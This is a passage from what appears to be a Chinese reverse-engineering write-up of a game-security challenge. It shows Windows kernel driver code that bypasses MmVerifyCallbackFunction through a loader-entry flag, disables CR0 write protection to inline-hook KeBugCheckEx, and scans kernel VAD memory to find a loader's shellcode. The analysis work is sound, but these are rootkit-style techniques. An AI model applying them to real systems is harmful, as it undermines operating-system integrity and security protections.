style="color: rgb(255, 255, 182);">UnDriver</span>(PDRIVER_OBJECT driver){    UNREFERENCED_PARAMETER(driver);    ObUnRegisterCallbacks(obHandle);}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(IN PDRIVER_OBJECT Driver, PUNICODE_STRING RegistryPath){    NTSTATUS status = STATUS_SUCCESS;    PLDR_DATA ldr;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"hello xia0ji233\n"</span>));    g_Object = Driver;    OB_CALLBACK_REGISTRATION obRegFileCallBack;    OB_OPERATION_REGISTRATION opRegFileCallBack;<br />    <span style="color: rgb(146, 255, 184);">// enable IoFileObjectType</span>    EnableObType(*IoFileObjectType);<br />    <span style="color: rgb(146, 255, 184);">// bypass MmVerifyCallbackFunction</span>    ldr = (PLDR_DATA)Driver-&gt;DriverSection;<br />    ldr-&gt;Flags |= <span style="color: rgb(255, 115, 253);">0x20</span>;<br />    <span style="color: rgb(146, 255, 184);">// 初始化回调</span><br />    memset(&amp;obRegFileCallBack, <span style="color: rgb(255, 115, 253);">0</span>, sizeof(obRegFileCallBack));    obRegFileCallBack.Version = ObGetFilterVersion();<br />    obRegFileCallBack.OperationRegistrationCount = <span style="color: rgb(255, 115, 253);">1</span>;<br />    obRegFileCallBack.RegistrationContext = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    RtlInitUnicodeString(&amp;obRegFileCallBack.Altitude, <span style="color: rgb(168, 255, 96);">L"321000"</span>);    obRegFileCallBack.OperationRegistration = &amp;opRegFileCallBack;<br />    memset(&amp;opRegFileCallBack, <span style="color: rgb(255, 115, 253);">0</span>, sizeof(opRegFileCallBack));    opRegFileCallBack.ObjectType = IoFileObjectType;    opRegFileCallBack.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;    opRegFileCallBack.PreOperation = (POB_PRE_OPERATION_CALLBACK)&amp;FileObjectpreCall;    status = ObRegisterCallbacks(&amp;obRegFileCallBack, &amp;obHandle);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!NT_SUCCESS(status))    {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"注册回调错误 \n"</span>));        status = STATUS_UNSUCCESSFUL;    }    UNREFERENCED_PARAMETER(RegistryPath);    Driver-&gt;DriverUnload = &amp;UnDriver;<br />    <span style="color: rgb(150, 203, 254);">return</span> status;<br />}</code></pre><p>该程序（附件中的XSafe2.sys）先加载，再加载Loader.sys同样可以任意user key加载成功并且不hook任何系统API和文件。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=dccc479b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePxdZjqm0RibjIwzyvAukcm3NgqACoICiaBRetoVa5tGEibBRrVPriaZNMMw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h4>分析shellcode反复在读取哪个内存地址（2分）</h4><p>shellcode加载之后，会检测双机调试</p><p>但是有一定的延迟，说明是主动检测的不是被动触发的，刚好遇上这个题，猜测是检测了一个调试器标志位。</p><p>不过这里感觉是得先确定一下 shellcode 的位置的，因为它带反调，不知道它怎么反调的，突然想到之前一位神仙把蓝屏代码删了导致电脑爆炸，于是我也想效仿一下看看可不可彳亍。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntdef.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntstatus.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_BACKTRACE_DEPTH 20</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SYMBOL L<span style="color: rgb(168, 255, 96);">"\\??\\xia0ji2333"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br />UINT64 BaseAddr=<span style="color: rgb(198, 197, 254);">NULL</span>, DLLSize=<span style="color: rgb(255, 115, 253);">0</span>;<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_BACKTRACE_DEPTH 20</span><br /><span style="color: rgb(255, 255, 182);">void</span> DeleteDevice(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start delete device\n"</span>), __LINE__);<br />    <span style="color: rgb(150, 203, 254);">if</span> (pDriver-&gt;DeviceObject) {        UNICODE_STRING Sym;<br />        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span style="color: rgb(146, 255, 184);">//CreateFile </span><br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Symbol\n"</span>), __LINE__);        IoDeleteSymbolicLink(&amp;Sym);<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Device\n"</span>), __LINE__);        IoDeleteDevice(pDriver-&gt;DeviceObject);    }<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: end delete device\n"</span>), __LINE__);}<br />HANDLE FileHandler = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(255, 255, 182);">char</span> newcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(146, 255, 184);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span><span style="color: rgb(146, 255, 184);">//jmp rax</span>};<br /><span style="color: rgb(255, 255, 182);">char</span> oldcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,};<br /><span style="color: rgb(255, 255, 182);">char</span>* target;KIRQL WPOFFx64(){    KIRQL irql = KeRaiseIrqlToDpcLevel();    UINT64 cr0 = __readcr0();<br />    cr0 &amp;= <span style="color: rgb(255, 115, 253);">0xfffffffffffeffff</span>;    __writecr0(cr0);    _disable();<br />    <span style="color: rgb(150, 203, 254);">return</span> irql;}<br /><span style="color: rgb(255, 255, 182);">void</span> WPONx64(KIRQL irql){    UINT64 cr0 = __readcr0();<br />    cr0 |= <span style="color: rgb(255, 115, 253);">0x10000</span>;    _enable();    __writecr0(cr0);    KeLowerIrql(irql);}NTSTATUS Unhook() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(newcode); i++) {        target[i] = oldcode[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}NTSTATUS Hook() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(newcode); i++) {        target[i] = newcode[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />PDRIVER_OBJECT g_Object = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _LDR_DATA_TABLE_ENTRY {    LIST_ENTRY InLoadOrderLinks;    LIST_ENTRY InMemoryOrderLinks;    LIST_ENTRY InInitializationOrderLinks;    PVOID DllBase;<br />    PVOID EntryPoint;<span style="color: rgb(146, 255, 184);">//驱动的进入点 DriverEntry  </span>    ULONG SizeOfImage;<br />    UNICODE_STRING FullDllName;<span style="color: rgb(146, 255, 184);">//驱动的满路径  </span><br />    UNICODE_STRING BaseDllName;<span style="color: rgb(146, 255, 184);">//不带路径的驱动名字  </span>    ULONG Flags;    USHORT LoadCount;    USHORT TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span> {        LIST_ENTRY HashLinks;<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            PVOID SectionPointer;            ULONG CheckSum;        };    };<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            ULONG TimeDateStamp;        };<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            PVOID LoadedImports;        };    };} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br /><span style="color: rgb(150, 203, 254);">typedef</span> NTSTATUS (* FuncPtr) (    _In_ ULONG BugCheckCode,    _In_ ULONG_PTR BugCheckParameter1,    _In_ ULONG_PTR BugCheckParameter2,    _In_ ULONG_PTR BugCheckParameter3,    _In_ ULONG_PTR BugCheckParameter4    );ULONG  myKeBugCheckEx(_In_ ULONG BugCheckCode,    _In_ ULONG_PTR BugCheckParameter1,    _In_ ULONG_PTR BugCheckParameter2,    _In_ ULONG_PTR BugCheckParameter3,    _In_ ULONG_PTR BugCheckParameter4) {    Unhook();    FuncPtr func = (FuncPtr)target;    PVOID backtrace[MAX_BACKTRACE_DEPTH];<br />    USHORT capturedFrames = RtlCaptureStackBackTrace(<span style="color: rgb(255, 115, 253);">0</span>, MAX_BACKTRACE_DEPTH, backtrace, <span style="color: rgb(198, 197, 254);">NULL</span>);<br />    <span style="color: rgb(150, 203, 254);">for</span> (USHORT i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; capturedFrames; i++) {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"xia0ji233:Backtrace[%u]: %p\n"</span>), i, backtrace[i]);    }<br />    kprintf((<span style="color: rgb(168, 255, 96);">"calling KeBugCheckEx(%p,%p,%p,%p,%p)\n"</span>),BugCheckCode,BugCheckParameter1,BugCheckParameter2,BugCheckParameter3,BugCheckParameter4);    DbgBreakPoint();    LARGE_INTEGER inTime;<br />    inTime.QuadPart = (LONGLONG) - <span style="color: rgb(255, 115, 253);">10</span> * <span style="color: rgb(255, 115, 253);">1000</span> * <span style="color: rgb(255, 115, 253);">1000</span> * <span style="color: rgb(255, 115, 253);">3600</span>;<br />    KeDelayExecutionThread(KernelMode, <span style="color: rgb(198, 197, 254);">FALSE</span>, &amp;inTime);    ULONG64 s = func(BugCheckCode,BugCheckParameter1,BugCheckParameter2,BugCheckParameter3,BugCheckParameter4);    Hook();<br />    <span style="color: rgb(150, 203, 254);">return</span> s;}MDLWriteMemory(PVOID pBaseAddress, PVOID pWriteData, SIZE_T writeDataSize){<br />    PMDL pMdl = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    PVOID pNewAddress = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />    pMdl = MmCreateMdl(<span style="color: rgb(198, 197, 254);">NULL</span>, pBaseAddress, writeDataSize);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">NULL</span> == pMdl)    {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">FALSE</span>;    }    MmBuildMdlForNonPagedPool(pMdl);    pNewAddress = MmMapLockedPages(pMdl, KernelMode);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">NULL</span> == pNewAddress)    {        IoFreeMdl(pMdl);    }    RtlCopyMemory(pNewAddress, pWriteData, writeDataSize);    MmUnmapLockedPages(pNewAddress, pMdl);    IoFreeMdl(pMdl);<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">TRUE</span>;}<br /><span style="color: rgb(255, 255, 182);">void</span> DriverUnload(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start unload\n"</span>), __LINE__);    Unhook();    DeleteDevice(pDriver);}NTSTATUS DriverEntry(    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {    DriverObject-&gt;DriverUnload = DriverUnload;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: RegistryPath = %S\n"</span>), __LINE__, RegistryPath-&gt;Buffer);<br />    UNICODE_STRING unName = { <span style="color: rgb(255, 115, 253);">0</span> };<br />    RtlInitUnicodeString(&amp;unName, L<span style="color: rgb(168, 255, 96);">"KeBugCheckEx"</span>);<br />    target = ((ULONG64)MmGetSystemRoutineAddress(&amp;unName))+<span style="color: rgb(255, 115, 253);">5</span>;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: KeBugCheckEx=%p\n"</span>), __LINE__, target);    g_Object = DriverObject;<br />    <span style="color: rgb(150, 203, 254);">if</span> (target) {<br />        <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(150, 203, 254);">sizeof</span>(oldcode); i++) {            oldcode[i] = target[i];        }<br />        *(UINT64*)(newcode + <span style="color: rgb(255, 115, 253);">2</span>) = myKeBugCheckEx;        Hook();    }<br />    <span style="color: rgb(150, 203, 254);">else</span> {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"xia0ji233:hahaha"</span>));    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>这里去hook KeBugCheckEx，然后直接让它 sleep 一小时，防止它蓝我，我有更多时间可以去分析。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=293b24d3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePibEPbeYppSh5ZzN0Libwrz52IdES9pjWCBDILlNOqhTOHjic4yFDJq6WQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>直接拿捏住了蓝屏。</p><p>在后面的分析中发现了 GameSec.exe 的内存一直在被读，估计是在搜索进程，然后读取进程的内存，这一部分后面没有分析太出来。</p><p>并且在运行的时候发现会读一些 exe 文件的字符串，在 shellcode 开头 + 80 的位置，这里后续没继续分析了。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=3c002299&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUePm8rnt0J8vljQInBKbBcoNQs7p3Ne6wVYfjiaK9356LD7U9SQ4s1EZJA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h4>编写一个search程序，在Load驱动运行后找到内核内存空间中的shellcode，输出shellcode范围内的任意地址</h4><p>随后想到去dump shellcode，这里注册回调的方式并不能成功拦截住，因此想到直接去 hook，判断线程起始位置是否在模块范围内，或者说在 Loader.sys 范围内，如果有都输出然后调试器看看内存像不像shellcode，无果，于是选择去跟一下，结果跟到一个类似shellcode的地方（很多浮点指令，看起来像垃圾指令的混淆），dump下来用 010 分析。</p><h5>方法1</h5><p>通过内存地址的特征可以发现，前八位可以通过 VAD 的方式去获取，后四个位每次加载似乎都是固定的，因此只需要爆破两个字节用一个特征去匹配就行了，这里。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">#include <span style="color: rgb(168, 255, 96);">"vad.h"</span>#include &lt;ntifs.h&gt;<br />#define <span style="color: rgb(255, 255, 182);">kprintf</span>(format, ...) <span style="color: rgb(255, 255, 182);">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)<br /><span style="color: rgb(146, 255, 184);">// 定义VAD相对于EProcess头部偏移值</span><br />#define eprocess_offset_VadRoot <span style="color: rgb(255, 115, 253);">0x658</span><br />#define eprocess_offset_VadCount <span style="color: rgb(255, 115, 253);">0x668</span><br />VOID <span style="color: rgb(255, 255, 182);">EnumVad</span>(PMMVAD Root, PALL_VADS pBuffer, ULONG nCnt){<br />    <span style="color: rgb(255, 255, 182);">if</span> (!Root || !pBuffer || !nCnt)    {<br />        <span style="color: rgb(150, 203, 254);">return</span>;    }<br />    __<span style="color: rgb(150, 203, 254);">try</span>    {<br />        <span style="color: rgb(255, 255, 182);">if</span> (nCnt &gt; pBuffer-&gt;nCnt)        {<br />            <span style="color: rgb(146, 255, 184);">// 得到起始页与结束页</span>            ULONG64 endptr = (ULONG64)Root-&gt;Core.EndingVpnHigh;<br />            endptr = endptr &lt;&lt; <span style="color: rgb(255, 115, 253);">32</span>;            ULONG64 startptr = (ULONG64)Root-&gt;Core.StartingVpnHigh;<br />            startptr = startptr &lt;&lt; <span style="color: rgb(255, 115, 253);">32</span>;<br />            <span style="color: rgb(146, 255, 184);">// 得到根节点</span>            pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].pVad = (ULONG_PTR)Root;<br />            <span style="color: rgb(146, 255, 184);">// 起始页: startingVpn * 0x1000</span>            pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].startVpn = (startptr | Root-&gt;Core.StartingVpn) &lt;&lt; PAGE_SHIFT;<br />            <span style="color: rgb(146, 255, 184);">// 结束页: EndVpn * 0x1000 + 0xfff</span><br />            pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].endVpn = ((endptr | Root-&gt;Core.EndingVpn) &lt;&lt; PAGE_SHIFT) + <span style="color: rgb(255, 115, 253);">0xfff</span>;<br />            <span style="color: rgb(146, 255, 184);">// VAD标志 928 = Mapped    1049088 = Private   ....</span>            pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].flags = Root-&gt;Core.u1.Flags.flag;<br />            <span style="color: rgb(146, 255, 184);">// 验证节点可读性</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>(Root-&gt;Subsection) &amp;&amp; <span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>(Root-&gt;Subsection-&gt;ControlArea))            {<br />                <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>((PVOID)((Root-&gt;Subsection-&gt;ControlArea-&gt;FilePointer.Value &gt;&gt; <span style="color: rgb(255, 115, 253);">4</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>)))                {<br />                    pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].pFileObject = ((Root-&gt;Subsection-&gt;ControlArea-&gt;FilePointer.Value &gt;&gt; <span style="color: rgb(255, 115, 253);">4</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>);                }            }            pBuffer-&gt;nCnt++;        }<br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>(Root-&gt;Core.VadNode.Left))        {<br />            <span style="color: rgb(146, 255, 184);">// 递归枚举左子树</span><br />            <span style="color: rgb(255, 255, 182);">EnumVad</span>((PMMVAD)Root-&gt;Core.VadNode.Left, pBuffer, nCnt);        }<br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>(Root-&gt;Core.VadNode.Right))        {<br />            <span style="color: rgb(146, 255, 184);">// 递归枚举右子树</span><br />            <span style="color: rgb(255, 255, 182);">EnumVad</span>((PMMVAD)Root-&gt;Core.VadNode.Right, pBuffer, nCnt);        }    }<br />    __except (<span style="color: rgb(255, 115, 253);">1</span>)    {    }}<br />BOOLEAN <span style="color: rgb(255, 255, 182);">EnumProcessVad</span>(ULONG Pid, PALL_VADS pBuffer, ULONG nCnt){<br />    PEPROCESS Peprocess = <span style="color: rgb(255, 115, 253);">0</span>;    PRTL_AVL_TREE Table = NULL;    PMMVAD Root = NULL;<br />    <span style="color: rgb(146, 255, 184);">// 通过进程PID得到进程EProcess</span><br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">NT_SUCCESS</span>(<span style="color: rgb(255, 255, 182);">PsLookupProcessByProcessId</span>((HANDLE)Pid, &amp;Peprocess)))    {<br />        <span style="color: rgb(146, 255, 184);">// 与偏移相加得到VAD头节点</span>        Table = (PRTL_AVL_TREE)((UCHAR*)Peprocess + eprocess_offset_VadRoot);<br />        <span style="color: rgb(255, 255, 182);">if</span> (!<span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>(Table) || !eprocess_offset_VadRoot)        {<br />            <span style="color: rgb(150, 203, 254);">return</span> FALSE;        }<br />        __<span style="color: rgb(150, 203, 254);">try</span>        {<br />            <span style="color: rgb(146, 255, 184);">// 取出头节点</span>            Root = (PMMVAD)Table-&gt;Root;<br />            <span style="color: rgb(255, 255, 182);">if</span> (nCnt &gt; pBuffer-&gt;nCnt)            {<br />                <span style="color: rgb(146, 255, 184);">// 得到起始页与结束页</span>                ULONG64 endptr = (ULONG64)Root-&gt;Core.EndingVpnHigh;<br />                endptr = endptr &lt;&lt; <span style="color: rgb(255, 115, 253);">32</span>;                ULONG64 startptr = (ULONG64)Root-&gt;Core.StartingVpnHigh;<br />                startptr = startptr &lt;&lt; <span style="color: rgb(255, 115, 253);">32</span>;                pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].pVad = (ULONG_PTR)Root;<br />                <span style="color: rgb(146, 255, 184);">// 起始页: startingVpn * 0x1000</span>                pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].startVpn = (startptr | Root-&gt;Core.StartingVpn) &lt;&lt; PAGE_SHIFT;<br />                <span style="color: rgb(146, 255, 184);">// 结束页: EndVpn * 0x1000 + 0xfff</span>                pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].endVpn = (endptr | Root-&gt;Core.EndingVpn) &lt;&lt; PAGE_SHIFT;                pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].flags = Root-&gt;Core.u1.Flags.flag;<br />                <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>(Root-&gt;Subsection) &amp;&amp; <span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>(Root-&gt;Subsection-&gt;ControlArea))                {<br />                    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>((PVOID)((Root-&gt;Subsection-&gt;ControlArea-&gt;FilePointer.Value &gt;&gt; <span style="color: rgb(255, 115, 253);">4</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>)))                    {<br />                        pBuffer-&gt;VadInfos[pBuffer-&gt;nCnt].pFileObject = ((Root-&gt;Subsection-&gt;ControlArea-&gt;FilePointer.Value &gt;&gt; <span style="color: rgb(255, 115, 253);">4</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">4</span>);                    }                }                pBuffer-&gt;nCnt++;            }<br />            <span style="color: rgb(146, 255, 184);">// 枚举左子树</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (Table-&gt;Root-&gt;Left)            {<br />                <span style="color: rgb(255, 255, 182);">EnumVad</span>((MMVAD*)Table-&gt;Root-&gt;Left, pBuffer, nCnt);            }<br />            <span style="color: rgb(146, 255, 184);">// 枚举右子树</span><br />            <span style="color: rgb(255, 255, 182);">if</span> (Table-&gt;Root-&gt;Right)            {<br />                <span style="color: rgb(255, 255, 182);">EnumVad</span>((MMVAD*)Table-&gt;Root-&gt;Right, pBuffer, nCnt);            }        }        __finally        {<br />            <span style="color: rgb(255, 255, 182);">ObDereferenceObject</span>(Peprocess);        }    }<br />    <span style="color: rgb(150, 203, 254);">else</span>    {<br />        <span style="color: rgb(150, 203, 254);">return</span> FALSE;    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;}<br />VOID <span style="color: rgb(255, 255, 182);">UnDriver</span>(PDRIVER_OBJECT driver){<br />    <span style="color: rgb(255, 255, 182);">kprintf</span>((<span style="color: rgb(168, 255, 96);">"unload\n"</span>));}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(IN PDRIVER_OBJECT Driver, PUNICODE_STRING RegistryPath){<br />    <span style="color: rgb(255, 255, 182);">kprintf</span>((<span style="color: rgb(168, 255, 96);">"hello xia0ji233\n"</span>));<br />    typedef <span style="color: rgb(150, 203, 254);">struct</span>    {        ULONG nPid;        ULONG nSize;        PALL_VADS pBuffer;    }VADProcess;<br />    __<span style="color: rgb(150, 203, 254);">try</span>    {<br />        VADProcess vad = { <span style="color: rgb(255, 115, 253);">0</span> };<br />        vad.nPid = <span style="color: rgb(255, 115, 253);">4</span>;<br />        <span style="color: rgb(146, 255, 184);">// 默认有1000个线程</span><br />        vad.nSize = <span style="color: rgb(255, 255, 182);">sizeof</span>(VAD_INFO) * <span style="color: rgb(255, 115, 253);">0x5000</span> + <span style="color: rgb(255, 255, 182);">sizeof</span>(ULONG);<br />        <span style="color: rgb(146, 255, 184);">// 分配临时空间</span><br />        vad.pBuffer = (PALL_VADS)<span style="color: rgb(255, 255, 182);">ExAllocatePool</span>(PagedPool, vad.nSize);<br />        <span style="color: rgb(146, 255, 184);">// 根据传入长度得到枚举数量</span><br />        ULONG nCount = (vad.nSize - <span style="color: rgb(255, 255, 182);">sizeof</span>(ULONG)) / <span style="color: rgb(255, 255, 182);">sizeof</span>(VAD_INFO);<br />        <span style="color: rgb(146, 255, 184);">// 枚举VAD</span><br />        <span style="color: rgb(255, 255, 182);">EnumProcessVad</span>(vad.nPid, vad.pBuffer, nCount);        uintptr_t addr;<br />        <span style="color: rgb(255, 255, 182);">for</span> (ULONG64 i = <span style="color: rgb(255, 115, 253);">0x0</span>; i &lt;<span style="color: rgb(255, 115, 253);">65536</span>; i++)        {<br />            addr = vad.pBuffer-&gt;VadInfos[<span style="color: rgb(255, 115, 253);">0</span>].pVad &amp; <span style="color: rgb(255, 115, 253);">0xffffffff00000000</span>;<br />            addr = addr + <span style="color: rgb(255, 115, 253);">0x1000</span>;<br />            addr = addr + (i&lt;&lt;<span style="color: rgb(255, 115, 253);">16</span>);<br />            <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">MmIsAddressValid</span>((PVOID)addr) &amp;&amp; *((ULONG64 *)addr) == <span style="color: rgb(255, 115, 253);">0x7C8B483024748B48</span> )            {<br />                <span style="color: rgb(255, 255, 182);">kprintf</span>((<span style="color: rgb(168, 255, 96);">"shellcode found in %p\n"</span>), addr);<br />                <span style="color: rgb(146, 255, 184);">//DbgBreakPoint();</span>                goto end;            }        }    }<br />    __except (<span style="color: rgb(255, 115, 253);">1</span>)    {<br />        <span style="color: rgb(255, 255, 182);">kprintf</span>((<span style="color: rgb(168, 255, 96);">"Something Error1\n"</span>));    }end:    Driver-&gt;DriverUnload = UnDriver;<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}</code></pre><p>vad.h</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; 